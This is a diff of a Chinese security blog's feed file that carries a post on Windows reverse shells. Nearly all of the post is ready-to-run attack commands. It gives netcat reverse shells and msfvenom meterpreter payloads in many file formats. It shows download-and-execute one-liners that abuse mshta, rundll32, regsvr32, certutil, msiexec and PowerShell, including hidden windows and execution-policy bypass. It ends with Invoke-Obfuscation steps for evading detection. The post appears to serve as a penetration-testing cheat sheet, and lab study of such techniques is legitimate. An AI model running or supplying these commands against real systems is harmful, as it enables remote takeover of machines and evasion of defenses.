+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/15.png"></p>
+<h6 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h6><p>PowerShell允许客户端通过执行cscript.exe来运行wsf、js和vbscript脚本。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">7777</span> <span class="operator">-f</span> vbs <span class="literal">-o</span> <span class="number">3</span>.vbs</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;(New-Object </span></span><br><span class="line"><span class="string">System.NET.WebClient).DownloadFile(&#x27;http://192.168.31.246/1.vbs&#x27;,\&quot;</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">&quot;);StartProcess %windir%\system32\cscript.exe \&quot;</span><span class="variable">$env:temp</span>\test.vbs\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/16.png"></p>
+<h6 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8888</span> <span class="literal">-o</span> <span class="number">1</span>.bat</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4455</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Metasploit生成exe文件"><a href="#Metasploit生成exe文件" class="headerlink" title="Metasploit生成exe文件"></a>Metasploit生成exe文件</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">4445</span> <span class="operator">-f</span> exe <span class="literal">-o</span> <span class="number">1</span>.exe</span><br><span class="line">msf5 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4445</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start</span> <span class="number">1</span>.exe</span><br><span class="line">powershell <span class="literal">-ep</span> bypass <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h4><h6 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line"><span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/17.png"></p>
+<h6 id="设置混淆脚本代码位置："><a href="#设置混淆脚本代码位置：" class="headerlink" title="设置混淆脚本代码位置："></a>设置混淆脚本代码位置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath D:\WEB\工具库\反弹shell\Windows反弹shell\PSBase64Convert.ps1</span><br></pre></td></tr></table></figure>
+
+<h6 id="选择混淆方式"><a href="#选择混淆方式" class="headerlink" title="选择混淆方式"></a>选择混淆方式</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">TOKEN\ALL\<span class="number">1</span>：</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/18.png"></p>
+<h6 id="保存混淆之后的脚本："><a href="#保存混淆之后的脚本：" class="headerlink" title="保存混淆之后的脚本："></a>保存混淆之后的脚本：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">out p.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/19.png"></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -1318,313 +1437,6 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       </tags>
   </entry>
   <entry>
-    <title>Window反弹Shell</title>
-    <url>/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/</url>
-    <content><![CDATA[<h1 id="Window反弹SHELL"><a href="#Window反弹SHELL" class="headerlink" title="Window反弹SHELL"></a>Window反弹SHELL</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-反弹SHELL简介"><a href="#0x00-反弹SHELL简介" class="headerlink" title="0x00  反弹SHELL简介"></a>0x00  反弹SHELL简介</h3><h6 id="什么是反弹shell（reverse-shell）？"><a href="#什么是反弹shell（reverse-shell）？" class="headerlink" title="什么是反弹shell（reverse shell）？"></a>什么是反弹shell（reverse shell）？</h6><p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
-<h6 id="为什么需要反弹shell？"><a href="#为什么需要反弹shell？" class="headerlink" title="为什么需要反弹shell？"></a>为什么需要反弹shell？</h6><p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
-<blockquote>
-<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p>
-<p>反向Shell（反弹Shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端 口被占用等问题导致被控端不能正常接收发送过来的数据包。</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01-Windows反弹Shell"><a href="#0x01-Windows反弹Shell" class="headerlink" title="0x01 Windows反弹Shell"></a>0x01 Windows反弹Shell</h3><h4 id="NetCat（NC）"><a href="#NetCat（NC）" class="headerlink" title="NetCat（NC）"></a>NetCat（NC）</h4><h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/1.png"></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="number">192.168</span>.<span class="number">31.198</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/2.png"></p>
-<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-e</span> cmd.exe <span class="number">192.168</span>.<span class="number">31.246</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/3.png"></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/4.png"></p>
-<h4 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h4><p>mshta.exe是用于负责解释运行HTA(HTML应用程序)文件的Windows系统应用程序。可以运行JavaScript或 VBScript的HTML文件。</p>
-<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lport <span class="number">7777</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/jmTzAZDOdeGOUV.hta</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/5.png"></p>
-<blockquote>
-<p>Tips:</p>
-<p>在VPS上使用hta_server模块设置lhost时可能会出现无法接收到shelll的问题，是因为VPS主机内部全部采用私有IP地址（如192.68.0.X)，通过一个公共的IP地址与外界进行通信。</p>
-<p>需要设置reverselistenerbindaddress 选项，绑定到本地系统上的特定IP地址</p>
-</blockquote>
-<h6 id><a href="#" class="headerlink" title></a></h6><h6 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> <span class="literal">-o</span> <span class="number">1</span>.hta</span><br><span class="line">python –m SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/<span class="number">1</span>.hta</span><br></pre></td></tr></table></figure>
-
-<h6 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h6><ol>
-<li>生成hta</li>
-</ol>
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/6.png"></p>
-<ol start="2">
-<li><p>生成恶意站点</p>
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/7.png"></p>
-</li>
-</ol>
-<h4 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h4><p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存 库中。 动态链接库英文为DLL (Dynamic Link Library) 。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p>
-<h6 id="MSF-SMB-Delivery"><a href="#MSF-SMB-Delivery" class="headerlink" title="MSF  SMB Delivery"></a>MSF  SMB Delivery</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; exploit <span class="literal">-j</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">&gt;rundll32.exe \\<span class="number">192.168</span>.<span class="number">31.246</span>\bupl\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/8.png"></p>
-<h6 id="Msfvenom生成反弹shell的dll"><a href="#Msfvenom生成反弹shell的dll" class="headerlink" title="Msfvenom生成反弹shell的dll"></a>Msfvenom生成反弹shell的dll</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-a</span> x64 -<span class="literal">-platform</span> windows <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">6666</span> <span class="operator">-f</span> dll &gt; lyxc.dll</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">6666</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/lyxc.dll	<span class="comment">#从控制端下载msfvenom生成的dll文件</span></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\Users\LYXC\lyxc.dll</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/9.png"></p>
-<h6 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> &gt; <span class="number">2</span>.hta</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">7777</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">2</span>.hta </span><br><span class="line">rundll32.exe url.dll,OpenURL C:\User\LYXC\<span class="number">2</span>.hta</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h4><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。 Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
-<blockquote>
-<p>语法:</p>
-<p>Regsvr32 [/s] [/u] [/n][/i[:cmdline]]  </p>
-<p>/u - 注销服务器 </p>
-<p>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载 </p>
-<p>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用 </p>
-<p>/s - 沉默; 不显示消息框</p>
-</blockquote>
-<h6 id="Web-Delivery模块启动Regsvr32"><a href="#Web-Delivery模块启动Regsvr32" class="headerlink" title="Web Delivery模块启动Regsvr32"></a>Web Delivery模块启动Regsvr32</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> target <span class="number">3</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span> </span><br><span class="line">msf6 exploit (web_delivery)&gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">regsvr32 /s /n /u /i:http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">3</span>urTH83.sct scrobj.dll</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/10.png"></p>
-<h4 id="Certuil-exe"><a href="#Certuil-exe" class="headerlink" title="Certuil.exe"></a>Certuil.exe</h4><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文 件以获得meterpreter会话。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">6667</span> <span class="operator">-f</span> exe &gt; msf6667.exe</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe c:\windows\temp\msf6667.exe &amp; <span class="built_in">start</span> </span><br><span class="line">c:\windows\temp\msf6667.exe</span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe delete</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h4><p>MSI就是microsoft installer的简写，是微软格式的安装包。一般是程序的安装软件包。 msiexe.exe是Windows系统安装引擎，MSI包就是使用msiexe.exe来解释安装。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">9999</span> <span class="operator">-f</span> msi &gt; <span class="number">1</span>.msi</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">msf &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">9999</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">31.246</span>/<span class="number">1</span>.msi</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Powershell-exe"><a href="#Powershell-exe" class="headerlink" title="Powershell.exe"></a>Powershell.exe</h4><h6 id="PowerShell加载远程脚本"><a href="#PowerShell加载远程脚本" class="headerlink" title="PowerShell加载远程脚本"></a>PowerShell加载远程脚本</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8899</span> <span class="operator">-f</span> psh<span class="literal">-reflection</span> <span class="literal">-o</span> shell.ps1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/11.png"></p>
-<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">powershell -windowstyle <span class="keyword">hidden</span> -exec bypass -<span class="keyword">c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/shell.ps1&#x27;)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/12.png"></p>
-<h6 id="PowerShell脚本Powercat"><a href="#PowerShell脚本Powercat" class="headerlink" title="PowerShell脚本Powercat"></a>PowerShell脚本Powercat</h6><p>Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码 的有效载荷。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/powercat.ps1&#x27;);powercat -c </span></span><br><span class="line"><span class="string">192.168.31.246 -p 8888 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/13.png"></p>
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/14.png"></p>
-<h6 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">msf6 exploit(web_delivery) &gt; exploit <span class="literal">-j</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/15.png"></p>
-<h6 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h6><p>PowerShell允许客户端通过执行cscript.exe来运行wsf、js和vbscript脚本。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">7777</span> <span class="operator">-f</span> vbs <span class="literal">-o</span> <span class="number">3</span>.vbs</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;(New-Object </span></span><br><span class="line"><span class="string">System.NET.WebClient).DownloadFile(&#x27;http://192.168.31.246/1.vbs&#x27;,\&quot;</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">&quot;);StartProcess %windir%\system32\cscript.exe \&quot;</span><span class="variable">$env:temp</span>\test.vbs\</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/16.png"></p>
-<h6 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8888</span> <span class="literal">-o</span> <span class="number">1</span>.bat</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4455</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="Metasploit生成exe文件"><a href="#Metasploit生成exe文件" class="headerlink" title="Metasploit生成exe文件"></a>Metasploit生成exe文件</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">4445</span> <span class="operator">-f</span> exe <span class="literal">-o</span> <span class="number">1</span>.exe</span><br><span class="line">msf5 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4445</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start</span> <span class="number">1</span>.exe</span><br><span class="line">powershell <span class="literal">-ep</span> bypass <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h4><h6 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line"><span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/17.png"></p>
-<h6 id="设置混淆脚本代码位置："><a href="#设置混淆脚本代码位置：" class="headerlink" title="设置混淆脚本代码位置："></a>设置混淆脚本代码位置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath D:\WEB\工具库\反弹shell\Windows反弹shell\PSBase64Convert.ps1</span><br></pre></td></tr></table></figure>
-
-<h6 id="选择混淆方式"><a href="#选择混淆方式" class="headerlink" title="选择混淆方式"></a>选择混淆方式</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">TOKEN\ALL\<span class="number">1</span>：</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/18.png"></p>
-<h6 id="保存混淆之后的脚本："><a href="#保存混淆之后的脚本：" class="headerlink" title="保存混淆之后的脚本："></a>保存混淆之后的脚本：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">out p.ps1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/19.png"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows密码凭证获取</title>
-    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
